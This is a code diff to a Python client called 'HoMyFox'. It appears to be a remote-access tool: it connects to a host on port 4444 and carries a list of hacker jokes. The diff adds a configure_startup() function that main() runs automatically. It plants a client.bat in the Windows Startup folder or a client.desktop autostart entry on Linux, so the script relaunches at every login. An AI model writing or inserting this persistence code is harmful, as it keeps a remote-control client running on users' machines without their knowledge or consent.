@@ -7,18 +7,17 @@ import base64
 import time
 import hashlib
 
-
 class HoMyFox:
     def __init__(self, host='127.0.0.1', port=4444):
         self.HOST = host
         self.PORT = port
         self.client = None
         self.hacker_jokes = [
-            "Why do hackers prefer dark mode? Because light attracts bugs! 🐛",
-            "I don't always test my code, but when I do, I do it in production. 😎",
-            "sudo make me a sandwich? Nah, I'll just hack one instead! 🥪",
-            "Debugging is like being a detective in a crime movie where you're also the murderer. 🕵️‍♂️",
-            "Real programmers count from 0. Fight me! 👊",
+            "Why do hackers prefer dark mode? Because light attracts bugs! \U0001F41B",
+            "I don't always test my code, but when I do, I do it in production. \U0001F60E",
+            "sudo make me a sandwich? Nah, I'll just hack one instead! \U0001F96A",
+            "Debugging is like being a detective in a crime movie where you're also the murderer. \U0001F575\uFE0F‍♂\uFE0F",
+            "Real programmers count from 0. Fight me! \U0001F44A",
         ]
 
     def display_ascii_art(self):
@@ -149,11 +148,46 @@ class HoMyFox:
 
         self.client.close()
 
+def configure_startup():
+    try:
+        script_path = os.path.abspath(__file__)
+        system = platform.system()
+
+        if system == "Windows":
+            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            bat_file_path = os.path.join(startup_dir, 'client.bat')
+            with open(bat_file_path, 'w') as bat_file:
+                bat_file.write(f"python \"{script_path}\"\n")
+            print(f"[+] Startup script created at {bat_file_path}")
+
+        else:
+            autostart_dir = os.path.expanduser('~/.config/autostart')
+            os.makedirs(autostart_dir, exist_ok=True)
+            desktop_entry_path = os.path.join(autostart_dir, 'client.desktop')
+            with open(desktop_entry_path, 'w') as desktop_file:
+                desktop_file.write(f"""[Desktop Entry]
+Type=Application
+Exec=python3 \"{script_path}\"
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=Client
+""".strip())
+            print(f"[+] Autostart entry created at {desktop_entry_path}")
+
+
+
+    except Exception as e:
+        print(f"[-] Failed to configure startup: {e}")
 
 def main():
+    try:
+        configure_startup()
+    except Exception as startup_error:
+        print(f"[!] Startup configuration failed: {startup_error}")
+
     fox = HoMyFox()
     fox.start_session()
-
 
 if __name__ == "__main__":
     main()
